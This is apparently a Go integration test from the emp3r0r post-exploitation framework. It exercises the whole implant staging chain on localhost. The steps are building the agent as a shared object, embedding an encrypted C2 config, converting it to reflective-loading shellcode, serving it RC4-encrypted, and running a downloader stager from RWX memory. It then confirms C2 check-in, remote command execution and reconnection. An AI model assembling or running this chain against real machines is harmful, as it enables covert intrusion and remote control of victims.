//go:build linux && cgo

package shellcode_stager

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/asn1"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/jobs"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/sliverarmory/malasada"
)

// signUUID signs the agent UUID with the CA private key
func signUUID(uuidStr, keyFile string) (string, error) {
	keyBytes, err := os.ReadFile(keyFile)
	if err != nil {
		return "", err
	}
	block, _ := pem.Decode(keyBytes)
	privKey, err := x509.ParseECPrivateKey(block.Bytes)
	if err != nil {
		return "", err
	}
	hash := sha256.Sum256([]byte(uuidStr))
	r, s, err := ecdsa.Sign(rand.Reader, privKey, hash[:])
	if err != nil {
		return "", err
	}
	sig, err := asn1.Marshal(struct{ R, S *big.Int }{r, s})
	if err != nil {
		return "", err
	}
	return base64.URLEncoding.EncodeToString(sig), nil
}

func TestAgentEndToEndLifecycle(t *testing.T) {
	if os.Getenv("CGO_ENABLED") != "1" {
		t.Skip("Skipping test: CGO_ENABLED is not set to 1")
	}
	if os.Getenv("EMP3R0R_RACE_ON") == "1" {
		t.Skip("Skipping test: race detector is enabled")
	}
	transports := []string{"http", "libcurl"}
	for _, mode := range []string{def.C2ChannelModeH2Conn, "http_poll"} {
		for _, tr := range transports {
			mode := mode
			tr := tr
			t.Run(mode+"/"+tr, func(t *testing.T) {
				runAgentEndToEndLifecycle(t, mode, tr)
			})
		}
	}
}

func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
	// 1. Setup workspace
	tmpDir, err := os.MkdirTemp("", "stager_test_*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)
	logging.Infof("Test workspace: %s", tmpDir)

	// 2. Build agent as ELF shared library (-buildmode=c-shared).
	//
	// Parameters mirror build.sh's build_shared_object() for linux/amd64:
	//   - tags:       "release emp3r0r_so"  (netgo is not added for linux in build.sh)
	//   - -buildvcs=false, -trimpath
	//   - -buildmode c-shared
	//   - ldflags:    -s -w -linkmode external
	//   - extldflags: -Wl,--gc-sections -s
	// "emp3r0r_so" activates main_cgo_shared.go which exports the `main`
	// symbol that malasada's stage0 calls after reflective loading.
	agentSOPath := filepath.Join(tmpDir, "agent.so")
	cmdBuildAgent := exec.Command(
		"go", "build",
		"-buildmode=c-shared",
		"-tags", "release emp3r0r_so",
		"-trimpath",
		"-buildvcs=false",
		"-ldflags", "-s -w -linkmode external -extldflags '-Wl,--gc-sections -s'",
		"-o", agentSOPath,
		"../../../cmd/agent",
	)
	cmdBuildAgent.Env = append(os.Environ(), "CGO_ENABLED=1")
	out, err := cmdBuildAgent.CombinedOutput()
	if err != nil {
		t.Fatalf("Failed to build agent shared library: %v\nOutput: %s", err, string(out))
	}
	logging.Successf("Agent shared library built at %s", agentSOPath)

	// 3. Setup C2 server config and certs.
	//    Must happen before malasada conversion so we can embed the real config
	//    into the .so before compression.
	c2Port := util.RandInt(50000, 60000)
	c2PortStr := fmt.Sprintf("%d", c2Port)

	live.EmpWorkSpace = tmpDir
	live.IsServer = true
	transport.EmpWorkSpace = tmpDir
	transport.CaCrtFile = filepath.Join(tmpDir, "ca-cert.pem")
	transport.CaKeyFile = filepath.Join(tmpDir, "ca-key.pem")
	transport.ServerCrtFile = filepath.Join(tmpDir, "server-cert.pem")
	transport.ServerKeyFile = filepath.Join(tmpDir, "server-key.pem")
	transport.OperatorCaCrtFile = filepath.Join(tmpDir, "operator-ca-cert.pem")
	transport.OperatorCaKeyFile = filepath.Join(tmpDir, "operator-ca-key.pem")
	transport.OperatorServerCrtFile = filepath.Join(tmpDir, "operator-server-cert.pem")
	transport.OperatorServerKeyFile = filepath.Join(tmpDir, "operator-server-key.pem")
	transport.OperatorClientCrtFile = filepath.Join(tmpDir, "operator-client-cert.pem")
	transport.OperatorClientKeyFile = filepath.Join(tmpDir, "operator-client-key.pem")
	live.EmpConfigFile = filepath.Join(tmpDir, "emp3r0r.json")

	if err = config.InitCertsAndConfig(); err != nil {
		t.Fatalf("Failed to init certs and config: %v", err)
	}
	if err = config.GenC2Certs("127.0.0.1"); err != nil {
		t.Fatalf("Failed to generate C2 certs: %v", err)
	}

	caCertData, err := os.ReadFile(transport.CaCrtFile)
	if err != nil {
		t.Fatalf("Failed to read CA cert: %v", err)
	}
	transport.CACrtPEM = caCertData
	transport.EmpWorkSpace = tmpDir

	agentUUID := uuid.New().String()
	agentTag := "test-stager-agent-" + agentUUID
	agentSig, err := signUUID(agentUUID, transport.CaKeyFile)
	if err != nil {
		t.Fatalf("Failed to sign UUID: %v", err)
	}

	c2HttpPortStr := fmt.Sprintf("%d", c2Port+1)
	preflightURL := fmt.Sprintf("http://127.0.0.1:%s/preflight-test", c2HttpPortStr)
	if mode == def.C2ChannelModeH2Conn {
		preflightURL = fmt.Sprintf("https://127.0.0.1:%s/preflight-test", c2PortStr)
	}

	malleableCfg := def.MalleableHTTPConfig{
		C2Path:        "/api/v1/telemetry",
		SessionHeader: "Cookie",
		SessionValue:  "sessionID=%s",
		InitHeader:    "Cookie",
		InitValue:     "init=1",
		CloseHeader:   "Cookie",
		CloseValue:    "close=1",
	}
	routes := def.C2Routing{
		Checkin: "c2-checkin",
		Msg:     "c2-msg",
		FTP:     "c2-ftp",
		WWW:     "c2-www",
		Proxy:   "c2-proxy",
	}

	live.RuntimeConfig = &def.Config{
		CCH2Port:         c2PortStr,
		CCHTTPPort:       c2HttpPortStr,
		C2ChannelMode:    mode,
		CAPEM:            string(caCertData),
		C2Routes:         routes,
		PreflightEnabled: true,
		PreflightURL:     preflightURL,
		PreflightMethod:  "GET",
		MalleableC2:      malleableCfg,
	}

	live.AgentControlMap = sync.Map{}
	live.AgentList = make([]*def.Emp3r0rAgent, 0)
	time.Sleep(100 * time.Millisecond)

	// 4. Encrypt config and patch the placeholder into the raw .so.
	//
	// IMPORTANT: patch BEFORE calling malasada.ConvertSharedObject so the
	// config bytes are already in place when aplib compresses the .so.
	// Patching after compression fails because aplib collapses the 4096-byte
	// run of 0xff into a short back-reference — the literal placeholder no
	// longer exists in the output blob.
	cfg := &def.Config{
		CCAddress:        "127.0.0.1",
		CCH2Port:         c2PortStr,
		CCHTTPPort:       c2HttpPortStr,
		C2ChannelMode:    mode,
		CAPEM:            string(caCertData),
		C2Routes:         routes,
		AgentUUID:        agentUUID,
		AgentUUIDSig:     agentSig,
		AgentTag:         agentTag,
		ModulePath:       "",
		CCTimeout:        1000,
		PreflightEnabled: true,
		PreflightURL:     preflightURL,
		PreflightMethod:  "GET",
		IsRunByStager:    true,
		MalleableC2:      malleableCfg,
	}
	cborBytes, err := cbor.Marshal(cfg)
	if err != nil {
		t.Fatalf("Failed to marshal config: %v", err)
	}
	encConfig, err := crypto.AES_GCM_Encrypt([]byte(def.MagicString), cborBytes)
	if err != nil {
		t.Fatalf("Failed to encrypt config: %v", err)
	}
	if len(encConfig) < len(def.AgentConfig) {
		encConfig = append(encConfig, bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(encConfig))...)
	} else if len(encConfig) > len(def.AgentConfig) {
		t.Fatalf("Config payload too large: %d > %d", len(encConfig), len(def.AgentConfig))
	}

	// Patch placeholder in the raw .so bytes.
	soBytes, err := os.ReadFile(agentSOPath)
	if err != nil {
		t.Fatalf("Failed to read agent.so: %v", err)
	}
	placeholder := bytes.Repeat([]byte{0xff}, len(def.AgentConfig))
	if !bytes.Contains(soBytes, placeholder) {
		t.Fatalf("AgentConfig placeholder (0xff * %d) not found in agent.so. "+
			"Verify the agent is built with the correct tags so def.AgentConfig is embedded.",
			len(def.AgentConfig))
	}
	patchedSOBytes := bytes.Replace(soBytes, placeholder, encConfig, 1)
	patchedSOPath := filepath.Join(tmpDir, "agent_patched.so")
	if err := os.WriteFile(patchedSOPath, patchedSOBytes, 0o755); err != nil {
		t.Fatalf("Failed to write patched agent.so: %v", err)
	}
	logging.Successf("agent.so patched with config (%d bytes)", len(patchedSOBytes))

	// 5. Convert the patched .so to a malasada reflective-ELF blob.
	//
	// Output layout: [malasada stage0 shellcode][aplib-compressed patched .so]
	// The stage0 entry convention matches downloader.c:
	//   typedef void (*stage1_entry)(void *base_addr, size_t total_size);
	malasadaPayload, err := malasada.ConvertSharedObject(patchedSOPath, "main", true)
	if err != nil {
		t.Fatalf("malasada.ConvertSharedObject failed: %v", err)
	}
	logging.Infof("Malasada payload size: %d bytes", len(malasadaPayload))

	payloadPath := filepath.Join(tmpDir, "agent_payload.bin")
	if err := os.WriteFile(payloadPath, malasadaPayload, 0o644); err != nil {
		t.Fatalf("Failed to write malasada payload: %v", err)
	}
	logging.Successf("Malasada payload ready")

	// 6. Start C2 server
	server.OPERATORS.Store("dummy", nil)
	if network.EmpTLSServer != nil {
		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
		time.Sleep(500 * time.Millisecond)
	}
	go func() {
		logging.Infof("Starting C2 server on port %s", c2PortStr)
		server.StartC2AgentTLSServer()
	}()
	if mode == "http_poll" {
		go server.StartC2HTTPServer()
	}
	defer func() {
		if network.EmpTLSServer != nil {
			network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
		}
	}()
	time.Sleep(2 * time.Second)

	// 6. Build stager.bin (downloader shellcode)
	//
	// downloader.c downloads the malasada payload, RC4-decrypts it (same key
	// derivation as buildServedBlob), then calls:
	//   typedef void (*stage1_entry)(void *base_addr, size_t total_size);
	//   entry(stage_blob, downloaded_size);
	// The malasada stage0 at the front of the blob handles the rest.
	stagerListenerPort := util.RandInt(60001, 65000)
	stagerPortStr := fmt.Sprintf("%d", stagerListenerPort)
	stagerKey := "password123"

	buildCmd := exec.Command(
		"./build.sh",
		"--download-host", "127.0.0.1",
		"--download-port", stagerPortStr,
		"--download-path", "/",
		"--download-key", stagerKey,
		"--stager-format", "shellcode",
		"--transport", tr,
		"--debug",
	)
	buildCmd.Dir = ".."
	buildCmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	out, err = buildCmd.CombinedOutput()
	if err != nil {
		t.Fatalf("build.sh failed: %v\nOutput: %s", err, string(out))
	}
	logging.Successf("Stager compiled successfully via build.sh (%s)", tr)

	stagerArtifact := filepath.Join(tmpDir, "stager.bin")
	input, err := os.ReadFile("../stager.bin")
	if err != nil {
		t.Fatalf("Failed to read stager.bin: %v", err)
	}
	if err := os.WriteFile(stagerArtifact, input, 0o755); err != nil {
		t.Fatalf("Failed to copy stager.bin to tmp: %v", err)
	}
	logging.Infof("Stage 0 stager size: %d bytes", len(input))
	os.Remove("../stager.bin")

	// 7. Start listener
	//
	// buildServedBlob encrypts the payload with the key-derived RC4 stream —
	// matching the rc4_crypt call in downloader_main.  compression=false
	// because the malasada payload is already position-independent shellcode;
	// compressing it a second time buys little and would require a second
	// decompressor.
	go func() {
		if err := listener.HTTPListener(payloadPath, stagerPortStr, stagerKey); err != nil {
			logging.Errorf("Stager listener failed: %v", err)
		}
	}()
	listenerReady := false
	for range 100 {
		conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", stagerPortStr))
		if err == nil {
			conn.Close()
			listenerReady = true
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if !listenerReady {
		t.Fatalf("Stager listener failed to start on port %s", stagerPortStr)
	}

	// 8. Build a thin runner that mmap's the raw stager shellcode and calls it.
	// stager.bin has its own _start (assembled in downloader.c) so we simply
	// mmap it RWX and call it with no arguments — the downloader sets up its
	// own stack frame internally.
	runnerSrc := filepath.Join(tmpDir, "stager_runner.c")
	runnerBin := filepath.Join(tmpDir, "stager_runner")
	runnerCode := "#define _GNU_SOURCE\n" +
		"#include <stdio.h>\n" +
		"#include <stdlib.h>\n" +
		"#include <sys/mman.h>\n" +
		"#include <unistd.h>\n" +
		"#include <fcntl.h>\n" +
		"int main(int argc, char **argv) {\n" +
		"    if (argc < 2) { fprintf(stderr, \"Usage: %s <stager.bin>\\n\", argv[0]); return 1; }\n" +
		"    int fd = open(argv[1], O_RDONLY);\n" +
		"    if (fd < 0) { perror(\"open\"); return 1; }\n" +
		"    long size = lseek(fd, 0, SEEK_END); lseek(fd, 0, SEEK_SET);\n" +
		"    fprintf(stderr, \"[runner] stager.bin: %ld bytes\\n\", size);\n" +
		"    void *buf = mmap(NULL, (size_t)size, PROT_READ|PROT_WRITE|PROT_EXEC,\n" +
		"                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n" +
		"    if (buf == (void*)-1) { perror(\"mmap\"); close(fd); return 1; }\n" +
		"    if (read(fd, buf, (size_t)size) != size) { perror(\"read\"); return 1; }\n" +
		"    close(fd);\n" +
		"    fprintf(stderr, \"[runner] jumping to %p\\n\", buf); fflush(stderr);\n" +
		"    ((void(*)(void))buf)();\n" +
		"    return 0;\n" +
		"}\n"
	if err := os.WriteFile(runnerSrc, []byte(runnerCode), 0o644); err != nil {
		t.Fatalf("Failed to write runner source: %v", err)
	}
	if out, err := exec.Command("gcc", "-rdynamic", "-o", runnerBin, runnerSrc, "-ldl").CombinedOutput(); err != nil {
		t.Fatalf("Failed to build stager runner: %v\nOutput: %s", err, string(out))
	}

	var stdout, stderr bytes.Buffer
	cmdRunner := exec.Command(runnerBin, stagerArtifact)
	logging.Infof("Running stager runner (%s)...", tr)

	cmdRunner.Stdout = &stdout
	cmdRunner.Stderr = &stderr
	cmdRunner.Env = append(
		os.Environ(),
		fmt.Sprintf("HOME=%s", tmpDir),
		"STAGER_TEST=1",
	)
	if err := cmdRunner.Start(); err != nil {
		t.Fatalf("Failed to start stager: %v", err)
	}
	doneChan := make(chan error, 1)
	go func() { doneChan <- cmdRunner.Wait() }()

	// 10. Wait for agent check-in
	timeout := 60 * time.Second
	start := time.Now()
	var agent *def.Emp3r0rAgent
	for {
		if time.Since(start) > timeout {
			fmt.Printf("Runner Stdout:\n%s\n", stdout.String())
			fmt.Printf("Runner Stderr:\n%s\n", stderr.String())
			t.Fatalf("Timeout waiting for agent checkin")
		}
		live.AgentControlMap.Range(func(key, value any) bool {
			k := key.(*def.Emp3r0rAgent)
			v := value.(*live.AgentControl)
			if k.Tag != "" && v.Conn != nil {
				agent = k
				return false
			}
			return true
		})
		if agent != nil {
			logging.Successf("Agent checked in! Tag: %s", agent.Tag)
			break
		}
		select {
		case err := <-doneChan:
			fmt.Printf("Runner Stdout:\n%s\n", stdout.String())
			fmt.Printf("Runner Stderr:\n%s\n", stderr.String())
			t.Fatalf("Stager runner exited before agent checkin: %v", err)
		default:
		}
		time.Sleep(100 * time.Millisecond)
	}

	// 11. Verify command execution
	logging.Infof("Verifying command execution...")
	job := jobs.CreateJob("ls", "command", agent.Tag)
	cmdID := job.ID
	live.CmdTime.Store(cmdID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	if err = agents.SendCmd("ls", cmdID, agent); err != nil {
		t.Fatalf("Failed to send command to agent: %v", err)
	}
	logging.Infof("Sent 'ls' command to agent %s", agent.Tag)

	outputReceived := false
	for i := 0; i < 20; i++ {
		if val, ok := live.AgentControlMap.Load(agent); ok {
			if val.(*live.AgentControl).Conn == nil {
				t.Fatalf("Agent disconnected while waiting for command output!")
			}
		}
		if res, ok := live.CmdResults.Load(cmdID); ok {
			output := res.(string)
			logging.Successf("Command output received: %s", output)
			if len(output) > 0 {
				outputReceived = true
				break
			}
		}
		time.Sleep(1 * time.Second)
	}
	if !outputReceived {
		t.Fatalf("Failed to receive command output")
	}
	logging.Println("Command output verification passed.")

	// 12. Restart / reconnection test
	//
	// With the malasada pipeline the agent runs in-process inside the runner
	// (no separate child process).  We attempt to find a child PID; if none is
	// found we skip the kill-and-reconnect sub-test but still verify the runner
	// is alive.
	logging.Infof("Testing restart/reconnection...")
	runnerPid := cmdRunner.Process.Pid
	entries, err := os.ReadDir("/proc")
	if err != nil {
		t.Fatalf("Failed to read /proc: %v", err)
	}
	childPid := 0
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		isNum := true
		for _, r := range entry.Name() {
			if r < '0' || r > '9' {
				isNum = false
				break
			}
		}
		if !isNum {
			continue
		}
		pid, _ := strconv.Atoi(entry.Name())
		data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
		if err != nil {
			continue
		}
		lp := bytes.LastIndexByte(data, ')')
		if lp < 0 || lp+2 >= len(data) {
			continue
		}
		fields := strings.Fields(string(data[lp+2:]))
		if len(fields) < 2 {
			continue
		}
		if ppid, _ := strconv.Atoi(fields[1]); ppid == runnerPid {
			childPid = pid
			break
		}
	}

	if childPid == 0 {
		logging.Warningf("No child process under runner PID %d — skipping kill-reconnect sub-test (agent runs in-process with malasada)", runnerPid)
	} else {
		logging.Infof("Killing agent process %d...", childPid)
		syscall.Kill(childPid, syscall.SIGKILL)

		var oldConn net.Conn
		if val, ok := live.AgentControlMap.Load(agent); ok {
			if ctrl, ok := val.(*live.AgentControl); ok {
				oldConn = ctrl.Conn
			}
		}
		startRestart := time.Now()
		reconnected := false
		lastCleanup := time.Time{}
		cleanupByUUID := func(u string) {
			live.AgentControlMap.Range(func(key, value any) bool {
				a, okA := key.(*def.Emp3r0rAgent)
				ctrl, okC := value.(*live.AgentControl)
				if !okA || !okC || a.UUID != u {
					return true
				}
				if ctrl.Cancel != nil {
					ctrl.Cancel()
				}
				if ctrl.Conn != nil {
					ctrl.Conn.Close()
				}
				live.AgentControlMap.Delete(key)
				return true
			})
		}
		for time.Since(startRestart) < 30*time.Second {
			if k, v, _, found := agents.RuntimeControlByUUID(agent.UUID); found {
				newConn := v != nil && v.Conn != nil && (oldConn == nil || v.Conn != oldConn)
				fresh := !k.LastSeen.IsZero() && !k.LastSeen.Before(startRestart)
				newPID := k.Process != nil && k.Process.PID != childPid
				if newConn || fresh || newPID {
					reconnected = true
				}
			}
			if reconnected {
				logging.Successf("Agent reconnected after kill.")
				break
			}
			if mode == "http_poll" && time.Since(startRestart) > 1*time.Second &&
				(lastCleanup.IsZero() || time.Since(lastCleanup) >= 5*time.Second) {
				agents.EndSession(agent.UUID)
				cleanupByUUID(agent.UUID)
				lastCleanup = time.Now()
			}
			time.Sleep(500 * time.Millisecond)
		}
		if !reconnected {
			t.Fatalf("Agent failed to reconnect after kill")
		}
	}

	// Final: verify runner is still alive
	select {
	case err := <-doneChan:
		logging.Debugf("Runner Stdout:\n%s", stdout.String())
		logging.Debugf("Runner Stderr:\n%s", stderr.String())
		t.Fatalf("Stager runner process died unexpectedly: %v", err)
	default:
		logging.Println("Stager runner still running — test passed.")
	}

	logging.Successf("TestAgentEndToEndLifecycle PASSED")

	// Cleanup
	cmdRunner.Process.Kill()
	listener.StopHTTP()
	if network.EmpTLSServer != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		network.EmpTLSServer.Shutdown(ctx)
		network.EmpTLSServerCancel()
	}
	if network.EmpKCPCancel != nil {
		network.EmpKCPCancel()
	}
}
